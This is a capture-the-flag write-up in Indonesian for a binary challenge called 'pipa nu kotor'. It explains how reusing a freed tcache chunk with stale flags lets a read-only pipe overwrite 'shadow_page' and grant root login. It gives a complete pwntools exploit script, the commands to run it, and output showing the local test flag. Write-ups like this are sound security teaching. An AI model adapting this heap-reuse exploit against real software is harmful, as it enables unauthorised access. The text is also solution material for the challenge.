# Pipa Nu Kotor — Eksploitasi

[← Overview](39-pipa-nu-kotor.md) · [Index](index.md)

### 3.1 Strategi

1. Buka pipa `rw` (`#0`).
2. Tulis satu byte → `flags |= 0x10`.
3. Tutup pipa `#0` → struct masuk tcache dengan flags `0x10`.
4. Buka pipa `ro` → chunk struct yang sama dipakai ulang, flags basi tetap.
5. Tulis `pwned\0` ke pipa `ro` → menimpa `shadow_page`.
6. Login dengan `pwned` → `cetak_flag()`.

Tidak perlu leak/libc/ROP; ini murni logika state dan tcache reuse.

### 3.2 Script exploit

Tersimpan di `writeups/assets/pipa-nu-kotor/exploit.py`:

```python
p.sendline(b'1'); p.recvuntil(b'mode (rw/ro) : '); p.sendline(b'rw')   # buka rw
p.sendline(b'3'); p.recvuntil(b'index : '); p.sendline(b'0')
p.recvuntil(b'data : '); p.sendline(b'A')                              # tulis -> flags=0x10
p.sendline(b'2'); p.recvuntil(b'index : '); p.sendline(b'0')           # tutup -> tcache
p.sendline(b'1'); p.recvuntil(b'mode (rw/ro) : '); p.sendline(b'ro')   # reuse chunk
p.sendline(b'3'); p.recvuntil(b'index : '); p.sendline(b'0')
p.recvuntil(b'data : '); p.sendline(b'pwned\x00')                      # overwrite shadow_page
p.sendline(b'5'); p.recvuntil(b'password : '); p.sendline(b'pwned')    # login root
```

Menjalankan:

```bash
cd writeups/assets/pipa-nu-kotor
echo 'NFX{LOCAL_TEST_FLAG_PIPA}' > flag.txt
python3 exploit.py | tee 03-exploit-run.txt
```

### 3.3 Output asli

```text
[*] Starting local process '.../peserta/pipa'
[+] Starting local process '.../peserta/pipa': pid 141909
[+] login sebagai root - akses diberikan
FLAG: NFX{LOCAL_TEST_FLAG_PIPA}
```

Fixture lokal berisi `NFX{LOCAL_TEST_FLAG_PIPA}`; flag kompetisi ada di bagian 4.
